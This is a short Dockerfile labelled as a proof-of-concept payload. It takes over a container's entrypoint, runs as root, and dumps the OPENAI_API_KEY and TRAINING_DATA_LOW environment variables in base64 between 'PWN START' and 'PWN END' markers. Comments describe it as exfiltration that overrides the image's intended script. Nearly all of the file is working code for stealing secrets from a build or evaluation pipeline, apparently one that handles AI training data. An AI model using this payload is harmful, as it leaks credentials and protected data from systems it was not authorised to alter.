FROM debian:bookworm-slim

# Install minimal dependencies required for the exfiltration
RUN apt-get update && apt-get install -y coreutils

# ... (Keep the rest of the installation steps if you want to avoid breaking the build process completely, 
#      but for the PoC, we only care about the final execution) ...

# -----------------------------------------------------------
# [!] THE PAYLOAD [!]
# We set the WORKDIR and USER to root to ensure we have permissions
WORKDIR /
USER root

# We use ENTRYPOINT to forcefully override whatever script the original image was supposed to run.
# This ensures our echo commands are the *only* thing that runs when 'docker run' is called.
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["echo '================PWN START================' && \
      echo 'OPENAI_API_KEY (Base64):' && \
      printenv OPENAI_API_KEY | base64 -w 0 && \
      echo '' && \
      echo 'TRAINING_DATA_LOW (Base64):' && \
      printenv TRAINING_DATA_LOW | base64 -w 0 && \
      echo '' && \
      echo '================PWN END=================='"]
